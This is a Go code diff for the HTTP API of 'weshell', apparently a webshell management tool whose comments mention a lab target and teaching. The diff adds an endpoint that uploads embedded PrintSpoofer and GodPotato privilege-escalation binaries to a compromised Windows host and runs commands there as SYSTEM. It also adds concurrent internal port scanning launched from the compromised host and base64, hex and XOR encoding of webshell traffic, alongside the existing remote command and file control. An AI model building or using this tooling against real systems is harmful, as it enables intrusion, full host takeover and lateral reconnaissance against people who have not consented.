@@ -5,15 +5,19 @@
 package api
 
 import (
+	"context"
 	"crypto/subtle"
 	"encoding/json"
 	"errors"
 	"fmt"
-	"log"
+	"github.com/sirupsen/logrus"
 	"net/http"
+	"net/http/cookiejar"
 	"net/url"
+	"sort"
 	"strconv"
 	"strings"
+	"sync"
 	"time"
 
 	"weshell/internal/shell"
@@ -23,35 +27,14 @@ import (
 // maxRequestBytes 限制接口请求体大小。
 const maxRequestBytes = 1 << 20 // 1 MiB
 
-// 单台主机端口扫描的每批端口数。分批目的是让「单次靶机脚本执行」控制在靶机自身
-// 脚本超时内（ASP 默认 Server.ScriptTimeout≈90s、PHP 默认 max_execution_time=30s），
-// 同时保证单次 weshell→靶机请求耗时尽量 ≤30s。每端口最坏等待约 2s
-// （ASP 见 vbsPortScan/aspPortScan 的 SetTimeouts，PHP 见 fsockopen 的第 5 参），
-// 故 12 端口/批 ≈24s，落在 30s 预算内。
-const scanBatchPorts = 12
-
+// 单台主机端口扫描：改为「单端口单请求 + 并发 + 单请求 35s 预算」，详见 handleScan。
+// 这里不再按端口分批，因为 ADO 的 ConnectionTimeout 对被过滤端口不生效，一个慢端口
+// 会把整批拖垮；拆成单端口并发后，慢端口只影响自己（故障隔离）。
+//
 // 内网多主机扫描每批的主机数。多主机走 HostScan（先存活探测再扫端口），单台主机
 // 最坏约 23s（探测+完整端口，见各模板超时）。每批 1 台即可保证单次请求 ≤30s；
 // 若愿接受更长的单请求，可酌情调大，但密集/全在线网段可能超出 30s 预算。
 const scanHostChunk = 1
-
-// splitPortList 把逗号分隔的端口串按每 n 个切成多批，返回每批的逗号串。
-// n<=0 时整体作为一批返回；空串返回空切片。
-func splitPortList(s string, n int) []string {
-	parts := strings.Split(s, ",")
-	if n <= 0 {
-		return []string{s}
-	}
-	out := make([]string, 0, (len(parts)+n-1)/n)
-	for i := 0; i < len(parts); i += n {
-		end := i + n
-		if end > len(parts) {
-			end = len(parts)
-		}
-		out = append(out, strings.Join(parts[i:end], ","))
-	}
-	return out
-}
 
 // chunkStrings 把字符串切片按每 n 个切成多批。n<=0 时退化为每批 1 个。
 func chunkStrings(ss []string, n int) [][]string {
@@ -81,18 +64,27 @@ type Config struct {
 	// LabURL 是本机的默认靶机地址（对应启动参数 -lab）。
 	// 只用于前端常驻展示，不参与任何请求。
 	LabURL string
+	// PrintSpooferEXE 是服务端内嵌的 PrintSpoofer.exe 字节（构建时经 //go:embed 注入），
+	// 供 /api/targets/{id}/privesc 自动部署到靶机提权使用。未内嵌时该接口返回明确错误。
+	PrintSpooferEXE []byte
+	// GodPotatoCppEXE 是服务端内嵌的 C++ 版 GodPotato 字节（tools/godpotato_cpp/godpotato_cpp.exe），
+	// 不依赖 .NET，供提权接口自动部署使用。
+	GodPotatoCppEXE []byte
+	// GodPotatoGoEXE 是服务端内嵌的纯 Go 版 GodPotato 字节（tools/godpotato/godpotato.exe）。
+	GodPotatoGoEXE []byte
 }
 
 // Server 承载 /api 下的全部路由。
 type Server struct {
 	store  *store.Store
-	logger *log.Logger
+	logger logrus.FieldLogger
 	cfg    Config
 	mux    *http.ServeMux
+	jars   sync.Map // 按靶机 ID 隔离的 cookie 罐，供会话模块机制跨请求维持靶机会话
 }
 
 // New 构造接口服务，返回值可直接挂到 /api/ 前缀下。
-func New(logger *log.Logger, st *store.Store, cfg Config) *Server {
+func New(logger logrus.FieldLogger, st *store.Store, cfg Config) *Server {
 	if cfg.Timeout <= 0 {
 		cfg.Timeout = 15 * time.Second
 	}
@@ -106,6 +98,15 @@ func New(logger *log.Logger, st *store.Store, cfg Config) *Server {
 	s.mux.HandleFunc("/api/types", s.wrap(s.handleTypes))
 	s.mux.HandleFunc("/api/targets", s.wrap(s.handleTargets))
 	s.mux.HandleFunc("/api/targets/", s.wrap(s.handleTargetItem))
+	// 系统信息：独立注册的专用路由，与 handleTargetItem 的通用子路径分发解耦。
+	//   GET /api/sysinfo/{id}     完整系统资源概览
+	//   GET /api/sysinfo/{id}/os  轻量：仅操作系统与主机名（选中靶标时快速判定系统类型）
+	// 说明：Go 1.21 的 ServeMux 不支持 {id} 通配符（Go 1.22+ 才支持），
+	// 因此靶标 ID 放在路径中、用子树模式 "/api/sysinfo/" 匹配后自行解析。
+	s.mux.HandleFunc("/api/sysinfo/", s.wrap(s.handleSysInfo))
+	// 模块缓存清理：DELETE /api/targets/modules/{id} 清空靶机会话中缓存的模块源码。
+	// 用更具体的子树模式覆盖 /api/targets/，避免与 handleTargetItem 冲突。
+	s.mux.HandleFunc("/api/targets/modules/", s.wrap(s.handleClearModules))
 	s.mux.HandleFunc("/api/settings", s.wrap(s.handleSettings))
 	s.mux.HandleFunc("/api/history", s.wrap(s.handleHistory))
 	return s
@@ -171,7 +172,7 @@ func (s *Server) handleSettings(w http.ResponseWriter, r *http.Request) {
 			writeJSON(w, http.StatusInternalServerError, newError(err.Error()))
 			return
 		}
-		s.logger.Printf("更新全局设置 userAgent=%q", in.UserAgent)
+		s.logger.Infof("更新全局设置 userAgent=%q", in.UserAgent)
 		writeJSON(w, http.StatusOK, s.store.GetSettings())
 	default:
 		writeJSON(w, http.StatusMethodNotAllowed, newError("只支持 GET / PUT"))
@@ -213,7 +214,7 @@ func (s *Server) handleTargets(w http.ResponseWriter, r *http.Request) {
 			writeJSON(w, http.StatusInternalServerError, newError(err.Error()))
 			return
 		}
-		s.logger.Printf("新增靶标 %s <%s>", created.Name, created.URL)
+		s.logger.Infof("新增靶标 %s <%s>", created.Name, created.URL)
 		writeJSON(w, http.StatusCreated, created)
 	default:
 		writeJSON(w, http.StatusMethodNotAllowed, newError("只支持 GET / POST"))
@@ -233,12 +234,6 @@ func (s *Server) handleTargetItem(w http.ResponseWriter, r *http.Request) {
 	// 文件管理：/api/targets/{id}/fs/{op}
 	if len(parts) >= 2 && parts[1] == "fs" {
 		s.handleFS(w, r, id, parts[2:])
-		return
-	}
-
-	// 系统监控：/api/targets/{id}/sys/info
-	if len(parts) >= 2 && parts[1] == "sys" {
-		s.handleSys(w, r, id)
 		return
 	}
 
@@ -282,6 +277,12 @@ func (s *Server) handleTargetItem(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
+	// 提权：/api/targets/{id}/privesc（POST；把内嵌 PrintSpoofer.exe 部署到靶机并以 SYSTEM 执行）
+	if len(parts) >= 2 && parts[1] == "privesc" && r.Method == http.MethodPost {
+		s.handlePrivEsc(w, r, id)
+		return
+	}
+
 	switch r.Method {
 	case http.MethodGet:
 		if len(parts) != 1 {
@@ -316,15 +317,17 @@ func (s *Server) handleTargetItem(w http.ResponseWriter, r *http.Request) {
 		}
 		// 不再强制探测：URL 变化只重置验证状态，真实连通性由「测试连接」主动验证。
 		t.Verified = old.Verified
+		t.Os = old.Os
 		if t.URL != old.URL {
 			t.Verified = false
+			t.Os = ""
 		}
 		updated, err := s.store.Update(id, t)
 		if err != nil {
 			writeJSON(w, http.StatusNotFound, newError(err.Error()))
 			return
 		}
-		s.logger.Printf("更新靶标 %s <%s>", updated.Name, updated.URL)
+		s.logger.Infof("更新靶标 %s <%s>", updated.Name, updated.URL)
 		writeJSON(w, http.StatusOK, updated)
 
 	case http.MethodDelete:
@@ -336,7 +339,7 @@ func (s *Server) handleTargetItem(w http.ResponseWriter, r *http.Request) {
 			writeJSON(w, http.StatusNotFound, newError(err.Error()))
 			return
 		}
-		s.logger.Printf("删除靶标 %s", id)
+		s.logger.Infof("删除靶标 %s", id)
 		writeJSON(w, http.StatusOK, map[string]string{"deleted": id})
 
 	case http.MethodPost:
@@ -379,7 +382,7 @@ func (s *Server) handleFS(w http.ResponseWriter, r *http.Request, id string, sub
 		writeJSON(w, http.StatusNotFound, newError("靶标不存在"))
 		return
 	}
-	if t.ShellType != shell.TypeEval && t.ShellType != shell.TypeAsp && t.ShellType != shell.TypeAspVbs {
+	if !shell.SupportsStructured(t.ShellType) {
 		writeJSON(w, http.StatusBadRequest, newError("文件管理仅支持 php-eval / asp 类型靶机"))
 		return
 	}
@@ -453,11 +456,29 @@ func (s *Server) handleFS(w http.ResponseWriter, r *http.Request, id string, sub
 	}
 }
 
-// handleSys 处理 /api/targets/{id}/sys/info：读取靶机系统资源概览。
-// 仅 php-eval / asp 类型靶机支持（需要提交 PHP / JScript 采集代码）。
-func (s *Server) handleSys(w http.ResponseWriter, r *http.Request, id string) {
+// handleSysInfo 处理系统信息相关请求（在 mux 中独立注册，与 handleTargetItem 解耦）：
+//
+//	GET /api/sysinfo/{id}      完整系统资源概览（CPU/内存/磁盘/进程/网络/公网 IP）
+//	GET /api/sysinfo/{id}/os   轻量：仅操作系统与主机名，供选中靶标时快速判定系统类型
+//
+// 说明：Go 1.21 的 ServeMux 不支持 {id} 通配符（Go 1.22+ 才支持），
+// 因此靶标 ID 放在路径中、由本处理器自行解析。
+// 仅 php-eval / asp / asp-vbs 类型靶机支持（需要提交 PHP / JScript 采集代码）；
+// 其中 /os 轻量接口仅 php-eval 支持（asp 一定是 Windows，调用方可直接判定）。
+func (s *Server) handleSysInfo(w http.ResponseWriter, r *http.Request) {
 	if r.Method != http.MethodGet {
 		writeJSON(w, http.StatusMethodNotAllowed, newError("只支持 GET"))
+		return
+	}
+	parts := strings.Split(strings.Trim(strings.TrimPrefix(r.URL.Path, "/api/sysinfo/"), "/"), "/")
+	id := parts[0]
+	if id == "" || strings.ContainsAny(id, "/\\") {
+		writeJSON(w, http.StatusBadRequest, newError("缺少靶标 ID"))
+		return
+	}
+	lightOS := len(parts) == 2 && parts[1] == "os"
+	if !lightOS && len(parts) != 1 {
+		writeJSON(w, http.StatusNotFound, newError("接口不存在"))
 		return
 	}
 	t, ok := s.store.Get(id)
@@ -465,12 +486,27 @@ func (s *Server) handleSys(w http.ResponseWriter, r *http.Request, id string) {
 		writeJSON(w, http.StatusNotFound, newError("靶标不存在"))
 		return
 	}
-	if t.ShellType != shell.TypeEval && t.ShellType != shell.TypeAsp && t.ShellType != shell.TypeAspVbs {
-		writeJSON(w, http.StatusBadRequest, newError("系统监控仅支持 php-eval / asp 类型靶机"))
-		return
+	// 轻量 /os 接口支持 php-eval / php-cmd / asp / asp-vbs；完整监控仅 php-eval / asp 支持
+	//（php-cmd 无 eval 通道，跑不了 /proc + wmic 那套采集代码）。
+	if lightOS {
+		if !shell.SupportsLightOS(t.ShellType) {
+			writeJSON(w, http.StatusBadRequest, newError("系统信息仅支持 php-eval / php-cmd / asp 类型靶机"))
+			return
+		}
+	} else {
+		if !shell.SupportsStructured(t.ShellType) {
+			writeJSON(w, http.StatusBadRequest, newError("系统监控仅支持 php-eval / asp 类型靶机"))
+			return
+		}
 	}
 	o := s.execOpts(t)
-	info, err := shell.Monitor(r.Context(), o)
+	var info map[string]any
+	var err error
+	if lightOS {
+		info, err = shell.OSInfo(r.Context(), o)
+	} else {
+		info, err = shell.Monitor(r.Context(), o)
+	}
 	if err != nil {
 		writeJSON(w, http.StatusBadRequest, newError(err.Error()))
 		return
@@ -490,7 +526,7 @@ func (s *Server) handleProc(w http.ResponseWriter, r *http.Request, id string) {
 		writeJSON(w, http.StatusNotFound, newError("靶标不存在"))
 		return
 	}
-	if t.ShellType != shell.TypeEval && t.ShellType != shell.TypeAsp && t.ShellType != shell.TypeAspVbs {
+	if !shell.SupportsStructured(t.ShellType) {
 		writeJSON(w, http.StatusBadRequest, newError("进程管理仅支持 php-eval / asp 类型靶机"))
 		return
 	}
@@ -515,7 +551,7 @@ func (s *Server) handleProcKill(w http.ResponseWriter, r *http.Request, id strin
 		writeJSON(w, http.StatusNotFound, newError("靶标不存在"))
 		return
 	}
-	if t.ShellType != shell.TypeEval && t.ShellType != shell.TypeAsp && t.ShellType != shell.TypeAspVbs {
+	if !shell.SupportsStructured(t.ShellType) {
 		writeJSON(w, http.StatusBadRequest, newError("进程管理仅支持 php-eval / asp 类型靶机"))
 		return
 	}
@@ -562,7 +598,7 @@ func (s *Server) handlePorts(w http.ResponseWriter, r *http.Request, id string) 
 		writeJSON(w, http.StatusNotFound, newError("靶标不存在"))
 		return
 	}
-	if t.ShellType != shell.TypeEval && t.ShellType != shell.TypeAsp && t.ShellType != shell.TypeAspVbs {
+	if !shell.SupportsStructured(t.ShellType) {
 		writeJSON(w, http.StatusBadRequest, newError("端口监听仅支持 php-eval / asp 类型靶机"))
 		return
 	}
@@ -589,7 +625,7 @@ func (s *Server) handleScan(w http.ResponseWriter, r *http.Request, id string) {
 		writeJSON(w, http.StatusNotFound, newError("靶标不存在"))
 		return
 	}
-	if t.ShellType != shell.TypeEval && t.ShellType != shell.TypeAsp && t.ShellType != shell.TypeAspVbs {
+	if !shell.SupportsStructured(t.ShellType) {
 		writeJSON(w, http.StatusBadRequest, newError("端口扫描仅支持 php-eval / asp 类型靶机"))
 		return
 	}
@@ -609,47 +645,136 @@ func (s *Server) handleScan(w http.ResponseWriter, r *http.Request, id string) {
 	}
 	o := s.execOpts(t)
 	if len(hosts) == 1 {
-		// 单台主机：把端口拆成小批逐批下发靶机扫描并合并结果。
-		// 拆批不是为了防 Go 侧超时，而是让「单次靶机脚本执行」控制在靶机自身脚本超时内
-		// （ASP 默认 Server.ScriptTimeout≈90s、PHP 默认 max_execution_time=30s），
-		// 否则大端口列表会被靶机自己掐掉返回 500，Go 侧把超时放再大也没用。
+		// 单台主机：逐个端口下发靶机扫描，并发执行并合并结果。
+		//
+		// 改为「单端口单请求」而不是按端口分批下发，是为了故障隔离：
+		// 某个被过滤/不可达的端口在靶机侧会挂到 OS 级 TCP 超时（约 21s，ADO 的
+		// ConnectionTimeout=2s 对它不生效）。若整批下发，一个慢端口就会拖垮整批的
+		// Go 侧预算（原先 5 端口 ×3.5s+10s=27.5s，小于靶机模板自带的 30s 预算，于是
+		// Go 先取消，整批报 context deadline exceeded）。拆成单端口并发后，慢端口只
+		// 影响自己，开放端口照常秒回。
+		//
+		// 单请求预算提到 35s（略高于靶机模板内部 30s 预算），保证即便某端口被过滤、
+		// 要等 OS 超时，靶机也能在 Go 取消前返回「关闭」，而非被 Go 掐成 deadline exceeded。
 		expanded, err := shell.ExpandPorts(ports)
 		if err != nil {
 			writeJSON(w, http.StatusBadRequest, newError(err.Error()))
 			return
 		}
-		batches := splitPortList(expanded, scanBatchPorts)
-		merged := make([]any, 0, 64)
-		var totalElapsed float64
-		for _, b := range batches {
-			pc := len(strings.Split(b, ","))
-			to := time.Duration(pc)*3500*time.Millisecond + 10*time.Second
-			if to > 30*time.Minute {
-				to = 30 * time.Minute
-			}
-			o.Timeout = to
-			info, err := shell.PortScan(r.Context(), o, hosts[0], b)
-			if err != nil {
-				writeJSON(w, http.StatusBadRequest, newError(err.Error()))
-				return
-			}
-			if ok, _ := info["ok"].(bool); !ok {
-				writeJSON(w, http.StatusBadRequest, newError(fmt.Sprintf("%v", info["error"])))
-				return
-			}
-			if ps, ok := info["ports"].([]any); ok {
-				merged = append(merged, ps...)
-			}
-			if e, ok := info["elapsed"].(float64); ok {
-				totalElapsed += e
-			}
+		portList := strings.Split(expanded, ",")
+		// 并发上限：避免大端口列表一次性打出几千个并发请求把靶机/网络打爆。
+		const maxConcurrency = 64
+		sem := make(chan struct{}, maxConcurrency)
+		type portOutcome struct {
+			entries []any
+			elapsed float64
+			err     error
+			method  string
+			diag    string
 		}
-		writeJSON(w, http.StatusOK, map[string]any{
+		outcomes := make([]portOutcome, len(portList))
+		var wg sync.WaitGroup
+		for i, p := range portList {
+			wg.Add(1)
+			sem <- struct{}{}
+			go func(i int, p string) {
+				defer wg.Done()
+				defer func() { <-sem }()
+				// 每个端口独立 context 与超时，互不影响（故障隔离）。
+				cctx, cancel := context.WithTimeout(r.Context(), 35*time.Second)
+				defer cancel()
+				opt := o
+				opt.Timeout = 35 * time.Second
+				info, err := shell.PortScan(cctx, opt, hosts[0], p)
+				if err != nil {
+					outcomes[i].err = err
+					return
+				}
+				if ok, _ := info["ok"].(bool); !ok {
+					if e, _ := info["error"].(string); e != "" {
+						outcomes[i].err = errors.New(e)
+					} else {
+						outcomes[i].err = fmt.Errorf("靶机返回非成功状态（HTTP %v）", info["status"])
+					}
+					return
+				}
+				if ps, ok := info["ports"].([]any); ok {
+					outcomes[i].entries = ps
+				}
+				if e, ok := info["elapsed"].(float64); ok {
+					outcomes[i].elapsed = e
+				}
+				if m, ok := info["method"].(string); ok && m != "" {
+					outcomes[i].method = m
+				}
+				if n, ok := info["note"].(string); ok && n != "" {
+					outcomes[i].diag = n
+				}
+				if d, ok := info["pwshDiag"].(string); ok && d != "" {
+					if outcomes[i].diag != "" {
+						outcomes[i].diag += " | "
+					}
+					outcomes[i].diag += d
+				}
+			}(i, p)
+		}
+		wg.Wait()
+
+		merged := make([]any, 0, len(portList))
+		var totalElapsed float64
+		var errs []string
+		for i, p := range portList {
+			if outcomes[i].err != nil {
+				// 单端口失败只记一笔，不拖垮整批（故障隔离）。
+				errs = append(errs, fmt.Sprintf("端口 %s: %v", p, outcomes[i].err))
+				continue
+			}
+			merged = append(merged, outcomes[i].entries...)
+			totalElapsed += outcomes[i].elapsed
+		}
+		// 按端口号升序，输出稳定、便于前端展示。
+		sort.Slice(merged, func(a, b int) bool {
+			pa, _ := merged[a].(map[string]any)["port"].(float64)
+			pb, _ := merged[b].(map[string]any)["port"].(float64)
+			return pa < pb
+		})
+		if len(merged) == 0 {
+			if len(errs) > 0 {
+				writeJSON(w, http.StatusBadRequest, newError(strings.Join(errs, "; ")))
+				return
+			}
+			// 所有端口均探测成功但未回传任何端口条目：通常是靶机对应端口全部关闭/过滤，
+			// 或靶机响应未夹带 ports 字段。这属于正常结果，应返回成功态（空列表），
+			// 而非 HTTP 400 + 空错误，否则前端会误报「请求失败（HTTP 400）」。
+			writeJSON(w, http.StatusOK, map[string]any{
+				"ok":      true,
+				"host":    hosts[0],
+				"ports":   []any{},
+				"elapsed": totalElapsed,
+				"note":    "未探测到开放端口",
+			})
+			return
+		}
+		resp := map[string]any{
 			"ok":      true,
 			"host":    hosts[0],
 			"ports":   merged,
 			"elapsed": totalElapsed,
-		})
+		}
+		// 取最后一个带 method 的批次，向前端透出本次实际使用的探测方式（便于排查靶机环境差异）。
+		for i := len(outcomes) - 1; i >= 0; i-- {
+			if outcomes[i].method != "" {
+				resp["method"] = outcomes[i].method
+				if outcomes[i].diag != "" {
+					resp["diag"] = outcomes[i].diag
+				}
+				break
+			}
+		}
+		if len(errs) > 0 {
+			resp["errors"] = errs
+		}
+		writeJSON(w, http.StatusOK, resp)
 		return
 	}
 	// 多台主机：按 scanHostChunk 分小批，每批在靶机上完成「存活探测 + 端口扫描」后返回并合并。
@@ -705,7 +830,7 @@ func (s *Server) handlePhpInfo(w http.ResponseWriter, r *http.Request, id string
 		writeJSON(w, http.StatusNotFound, newError("靶标不存在"))
 		return
 	}
-	if t.ShellType != shell.TypeEval && t.ShellType != shell.TypeAsp && t.ShellType != shell.TypeAspVbs {
+	if !shell.SupportsStructured(t.ShellType) {
 		writeJSON(w, http.StatusBadRequest, newError("环境能力仅支持 php-eval / asp 类型靶机"))
 		return
 	}
@@ -714,6 +839,8 @@ func (s *Server) handlePhpInfo(w http.ResponseWriter, r *http.Request, id string
 	var err error
 	if t.ShellType == shell.TypeAsp || t.ShellType == shell.TypeAspVbs {
 		info, err = shell.AspEnv(r.Context(), o)
+	} else if t.ShellType == shell.TypeAspnet {
+		info, err = shell.AspNetEnv(r.Context(), o)
 	} else {
 		info, err = shell.PhpInfo(r.Context(), o)
 	}
@@ -759,8 +886,15 @@ func (s *Server) handleVerify(w http.ResponseWriter, r *http.Request, id string)
 
 	// 持久化验证结果，便于列表展示是否已验证、以及教学时区分「登记了但没连上」。
 	t.Verified = verified
+	// 连通即顺带实测操作系统类型（lightweight），写回靶标，保证列表直接显示正确系统图标；
+	// 非 php/asp 类型或探测失败均不阻塞验证，Os 留空由前端按引擎类型猜测。
+	if verified {
+		if os := detectOS(r.Context(), s, t); os != "" {
+			t.Os = os
+		}
+	}
 	if _, err := s.store.Update(id, t); err != nil {
-		s.logger.Printf("更新靶标 %s 验证状态失败: %v", id, err)
+		s.logger.Infof("更新靶标 %s 验证状态失败: %v", id, err)
 	}
 	s.store.TouchLastUsed(id)
 
@@ -771,8 +905,26 @@ func (s *Server) handleVerify(w http.ResponseWriter, r *http.Request, id string)
 		"latencyMs": probe.LatencyMS,
 		"error":     probe.Error,
 		"output":    probe.Output,
+		"os":        t.Os,
 	})
 }
+
+// detectOS 在验证通过后顺带实测靶机操作系统类型，返回归一化标识
+//（'windows'/'linux'/'mac'）；不支持或探测失败返回空串（不阻塞验证）。
+func detectOS(ctx context.Context, s *Server, t store.Target) string {
+	// ASP/ASP-VBS 必跑在 IIS/Windows 上，无需探测即可判定。
+	if t.ShellType == "asp" || t.ShellType == "asp-vbs" || t.ShellType == "aspnet" {
+		return "windows"
+	}
+	// php-eval / php-cmd 均由 shell.OSInfo 返回归一化后的 os 标识。
+	info, err := shell.OSInfo(ctx, s.execOpts(t))
+	if err != nil {
+		return ""
+	}
+	os, _ := info["os"].(string)
+	return os
+}
+
 func (s *Server) auditFS(id, op, path string, ok bool) {
 	s.store.TouchLastUsed(id)
 	s.store.AppendRecord(store.CommandRecord{
@@ -795,14 +947,14 @@ func (s *Server) execCommand(w http.ResponseWriter, r *http.Request, id string) 
 	}
 
 	// 审计日志先行落地：即便靶机无响应，也能留下「谁执行了什么」的痕迹。
-	s.logger.Printf("执行命令 target=%s<%s> command=%q", t.Name, t.URL, truncate(in.Command, 300))
+	s.logger.Infof("执行命令 target=%s<%s> command=%q", t.Name, t.URL, truncate(in.Command, 300))
 
 	res := shell.Execute(r.Context(), s.execOpts(t).WithCommand(in.Command))
 
 	// 失败时单独打一行，避免「HTTP 200 + body 里 ok:false」把问题藏起来，
 	// 否则只看访问日志会误以为一切正常。
 	if !res.OK {
-		s.logger.Printf("命令执行失败 target=%s<%s> command=%q error=%q latency=%dms",
+		s.logger.Infof("命令执行失败 target=%s<%s> command=%q error=%q latency=%dms",
 			t.Name, t.URL, truncate(in.Command, 300), firstLine(res.Error), res.LatencyMS)
 	}
 
@@ -815,6 +967,115 @@ func (s *Server) execCommand(w http.ResponseWriter, r *http.Request, id string) 
 		Message:   firstLine(res.Error),
 	})
 	writeJSON(w, http.StatusOK, res)
+}
+
+// handlePrivEsc 处理 /api/targets/{id}/privesc：把服务端内嵌的提权工具自动部署到靶机并以
+// SYSTEM 身份执行，返回命令回显。仅支持结构化类型靶机（自动部署走文件写入通道）。
+//
+// 请求体：{ tool, path, mode, command, pid }。tool ∈ printspoofer|godpotato-go
+// （godpotato-cpp 仍保留兼容）；path 缺省由 tool 决定；
+// mode ∈ command|list|interactive（PrintSpoofer 专用，GodPotato 只支持 command；
+// pid 对应 PrintSpoofer 的 -p）。
+func (s *Server) handlePrivEsc(w http.ResponseWriter, r *http.Request, id string) {
+	if r.Method != http.MethodPost {
+		writeJSON(w, http.StatusMethodNotAllowed, newError("只支持 POST"))
+		return
+	}
+	t, ok := s.store.Get(id)
+	if !ok {
+		writeJSON(w, http.StatusNotFound, newError("靶标不存在"))
+		return
+	}
+	var in struct {
+		Tool    string `json:"tool"` // 提权工具：printspoofer | godpotato-go | godpotato-cpp
+		Path    string `json:"path"`
+		Mode    string `json:"mode"`
+		Command string `json:"command"`
+		PID     string `json:"pid"`
+		// DeployOnly 为真时只部署并校验，不执行提权（前端「部署自检」按钮用），
+		// 返回逐步报告，便于在不跑提权的前提下定位上传/组装/校验环节的问题。
+		DeployOnly bool `json:"deployOnly"`
+	}
+	if !decodeJSON(w, r, &in) {
+		return
+	}
+	tool := strings.ToLower(strings.TrimSpace(in.Tool))
+	exe, defPath, terr := s.privescTool(tool)
+	if terr != nil {
+		writeJSON(w, http.StatusBadRequest, newError(terr.Error()))
+		return
+	}
+	path := strings.TrimSpace(in.Path)
+	if path == "" {
+		path = defPath
+	}
+	mode := strings.TrimSpace(in.Mode)
+	if mode == "" {
+		mode = "command"
+	}
+	o := s.execOpts(t)
+
+	// 仅部署自检：不执行提权，把每一步的命令与回显原样返回给前端展示。
+	if in.DeployOnly {
+		rep, err := shell.DeployOnly(r.Context(), o, shell.PrivEscOptions{
+			EXE:  exe,
+			Path: path,
+		})
+		if err != nil {
+			rep.Steps = append(rep.Steps, shell.DeployStep{Name: "失败", Cmd: "", Output: err.Error(), OK: false})
+			writeJSON(w, http.StatusOK, rep)
+			return
+		}
+		s.store.TouchLastUsed(id)
+		writeJSON(w, http.StatusOK, rep)
+		return
+	}
+
+	res, err := shell.PrivEsc(r.Context(), o, shell.PrivEscOptions{
+		EXE:     exe,
+		Tool:    tool,
+		Path:    path,
+		Mode:    mode,
+		Command: in.Command,
+		PID:     strings.TrimSpace(in.PID),
+	})
+	if err != nil {
+		writeJSON(w, http.StatusBadRequest, newError(err.Error()))
+		return
+	}
+	s.logger.Infof("提权执行 target=%s<%s> tool=%s mode=%s path=%s deployed=%s", t.Name, t.URL, tool, mode, path, res.DeployedPath)
+	s.store.TouchLastUsed(id)
+	s.store.AppendRecord(store.CommandRecord{
+		TargetID:  id,
+		Command:   "privesc:" + tool + " " + mode + " " + path,
+		OK:        res.OK,
+		LatencyMS: res.LatencyMS,
+		Message:   firstLine(res.Error),
+	})
+	writeJSON(w, http.StatusOK, res)
+}
+
+// privescTool 按工具名返回对应的内嵌二进制与默认落盘路径。
+// 留空按 printspoofer 处理（兼容旧前端）。
+func (s *Server) privescTool(name string) (exe []byte, defPath string, err error) {
+	switch strings.ToLower(strings.TrimSpace(name)) {
+	case "", "printspoofer":
+		if len(s.cfg.PrintSpooferEXE) == 0 {
+			return nil, "", errors.New("PrintSpoofer.exe 未内嵌：请确认构建 weshell 前 tools/printspoofer/PrintSpoofer.exe 已存在")
+		}
+		return s.cfg.PrintSpooferEXE, `C:\Windows\Temp\PrintSpoofer.exe`, nil
+	case "godpotato-cpp":
+		if len(s.cfg.GodPotatoCppEXE) == 0 {
+			return nil, "", errors.New("GodPotato(C++) 未内嵌：请先运行 tools/godpotato_cpp/build.bat 生成 godpotato_cpp.exe 再构建 weshell")
+		}
+		return s.cfg.GodPotatoCppEXE, `C:\Windows\Temp\godpotato_cpp.exe`, nil
+	case "godpotato-go":
+		if len(s.cfg.GodPotatoGoEXE) == 0 {
+			return nil, "", errors.New("GodPotato(Go) 未内嵌：请先在 tools/godpotato 下 go build -o godpotato.exe . 再构建 weshell")
+		}
+		return s.cfg.GodPotatoGoEXE, `C:\Windows\Temp\godpotato.exe`, nil
+	}
+	return nil, "", fmt.Errorf("未知提权工具: %q", name)
 }
 
 func (s *Server) handleHistory(w http.ResponseWriter, r *http.Request) {
@@ -835,13 +1096,15 @@ func (s *Server) handleHistory(w http.ResponseWriter, r *http.Request) {
 
 // targetInput 是靶标的新增/更新入参。
 type targetInput struct {
-	Name      string `json:"name"`
-	URL       string `json:"url"`
-	ShellType string `json:"shellType"`
-	Param     string `json:"param"`
-	Method    string `json:"method"`
-	Proxy     string `json:"proxy"`
-	Note      string `json:"note"`
+	Name        string `json:"name"`
+	URL         string `json:"url"`
+	ShellType   string `json:"shellType"`
+	Param       string `json:"param"`
+	Method      string `json:"method"`
+	Proxy       string `json:"proxy"`
+	Note        string `json:"note"`
+	Encoding    string `json:"encoding"`
+	EncodingKey string `json:"encodingKey"`
 }
 
 // normalize 校验并规范化入参。
@@ -875,6 +1138,17 @@ func (in targetInput) normalize() (store.Target, error) {
 	if !shell.Valid(in.ShellType) {
 		return store.Target{}, fmt.Errorf("未知的连接类型: %q", in.ShellType)
 	}
+	enc := strings.ToLower(strings.TrimSpace(in.Encoding))
+	if enc == "none" {
+		enc = ""
+	}
+	if enc != "" && enc != "base64" && enc != "hex" && enc != "xor" {
+		return store.Target{}, fmt.Errorf("不支持的编码方式: %q", in.Encoding)
+	}
+	key := strings.TrimSpace(in.EncodingKey)
+	if enc == "xor" && key == "" {
+		return store.Target{}, errors.New("xor 编码需要提供密钥(encodingKey)")
+	}
 	proxy := strings.TrimSpace(in.Proxy)
 	if proxy != "" {
 		if _, err := shell.ProxyURL(proxy); err != nil {
@@ -882,13 +1156,15 @@ func (in targetInput) normalize() (store.Target, error) {
 		}
 	}
 	return store.Target{
-		Name:      name,
-		URL:       rawURL,
-		ShellType: in.ShellType,
-		Param:     param,
-		Method:    method,
-		Proxy:     proxy,
-		Note:      strings.TrimSpace(in.Note),
+		Name:        name,
+		URL:         rawURL,
+		ShellType:   in.ShellType,
+		Param:       param,
+		Method:      method,
+		Proxy:       proxy,
+		Note:        strings.TrimSpace(in.Note),
+		Encoding:    enc,
+		EncodingKey: key,
 	}, nil
 }
 
@@ -896,14 +1172,69 @@ func (in targetInput) normalize() (store.Target, error) {
 // 以及全局设置里的 User-Agent（默认 / 固定 / 随机）。
 func (s *Server) execOpts(t store.Target) shell.ExecOptions {
 	return shell.ExecOptions{
-		TargetURL: t.URL,
-		Param:     t.Param,
-		Method:    t.Method,
-		Type:      t.ShellType,
-		Timeout:   s.cfg.Timeout,
-		Proxy:     t.Proxy,
-		UserAgent: s.store.GetSettings().UserAgent,
+		TargetURL:   t.URL,
+		Param:       t.Param,
+		Method:      t.Method,
+		Type:        t.ShellType,
+		Timeout:     s.cfg.Timeout,
+		Proxy:       t.Proxy,
+		UserAgent:   s.store.GetSettings().UserAgent,
+		Encoding:    t.Encoding,
+		EncodingKey: t.EncodingKey,
+		Jar:         s.jarFor(t.ID),
 	}
+}
+
+// laxPublicSuffixList 是一个宽松的公共后缀列表实现：对任意主机都返回空后缀，
+// 从而允许 net/http/cookiejar 为 localhost / 127.0.0.1 / 纯 IP 这类"无公共后缀"的
+// 主机设置 cookie（默认列表会拒绝，导致会话无法保持）。
+type laxPublicSuffixList struct{}
+
